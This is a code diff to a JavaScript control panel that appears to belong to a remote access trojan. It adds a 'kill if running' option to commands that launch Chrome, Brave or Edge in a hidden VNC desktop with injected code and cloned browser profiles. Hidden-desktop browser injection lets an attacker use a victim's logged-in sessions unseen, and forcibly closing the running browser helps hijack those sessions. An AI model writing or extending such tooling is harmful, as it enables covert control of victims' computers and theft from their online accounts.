@@ -801,15 +801,18 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
         } else if (action === "start-chrome") {
           const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
-          sendCmd("hvnc_start_browser_injected", { browser: "chrome", clone, cloneLite });
+          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "chrome", clone, cloneLite, killIfRunning });
         } else if (action === "start-brave") {
           const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
-          sendCmd("hvnc_start_browser_injected", { browser: "brave", clone, cloneLite });
+          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "brave", clone, cloneLite, killIfRunning });
         } else if (action === "start-edge") {
           const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
-          sendCmd("hvnc_start_browser_injected", { browser: "edge", clone, cloneLite });
+          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "edge", clone, cloneLite, killIfRunning });
         } else if (action === "start-custom") {
           const exePath = prompt("Enter exe path (required)");
           if (!exePath) {
